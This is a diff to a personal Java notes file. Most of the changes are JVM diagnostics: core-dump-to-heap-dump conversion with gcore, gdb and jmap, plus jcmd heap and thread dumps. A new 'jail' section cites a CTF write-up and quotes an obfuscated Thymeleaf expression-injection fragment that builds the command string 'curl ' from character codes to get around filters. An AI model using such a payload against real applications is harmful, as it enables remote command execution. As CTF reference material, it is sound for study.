@@ -352,7 +352,21 @@ jcmd $PID VM.flags
 
 -XX:+CreateMinidumpOnCrash
 
+### Java <= 8, Linux
+
+```bash
+# Generate core dump
+sudo gcore -o dump $PID
+# ||
+sudo gdb -p $PID -batch -ex generate-core-file
+
+# Convert core dump to heap dump
+sudo $JVM_USED_WHILE_GCORE_HOME/bin/jmap -dump:format=b,file=$OUTPUT_HPROF_FILE $JVM_USED_WHILE_GCORE_HOME/bin/java $CORE_FILE_PATH
+```
+
 # debug
+
+- symbols: libjvm.so
 
 ```bash
 java -agentlib:jdwp=transport=dt_shmem,address=jdbconn,server=y,suspend=n MyClass
@@ -522,12 +536,12 @@ jcmd $JAVA_PID GC.class_histogram > /tmp/class_histogram.log
 
 # :) better performance
 # e.g. heap size ~= 4G
-# jmap ~= 1h execution time
-# jcmd ~= 5m execution time
+# - jmap ~= 1h execution time
+# - jcmd ~= 5m execution time
 # with full gc:
-# jcmd $JAVA_PID GC.heap_dump /tmp/heap_dump.hprof
-# -- https://stackoverflow.com/questions/23393480/can-heap-dump-be-created-for-analyzing-memory-leak-without-garbage-collection
+jcmd $JAVA_PID GC.heap_dump /tmp/heap_dump.hprof
 # without full gc:
+# - https://stackoverflow.com/questions/23393480/can-heap-dump-be-created-for-analyzing-memory-leak-without-garbage-collection
 jcmd $JAVA_PID GC.heap_dump -all /tmp/heap_dump.hprof
 # => unable to open socket file: target process not responding or HotSpot VM not loaded
 sudo -u foo jcmd $JAVA_PID Thread.print > /tmp/thread_dump.log
@@ -1314,3 +1328,10 @@ https://medium.com/@afinepl/java-rmi-for-pentesters-part-two-reconnaissance-atta
 # GUI
 
 - [Java Swing Tutorial \- javatpoint](https://www.javatpoint.com/java-swing)
+
+# jail
+
+- https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf
+	```
+	(0).toString().charAt(0).toChars(99)%5b0%5d.toString()+(0).toString().charAt(0).toChars(117)%5b0%5d.toString()+(0).toString().charAt(0).toChars(114)%5b0%5d.toString()+(0).toString().charAt(0).toChars(108)%5b0%5d.toString()+(0).toString().charAt(0).toChars(32)%5b0%5d.toString()+
+	```
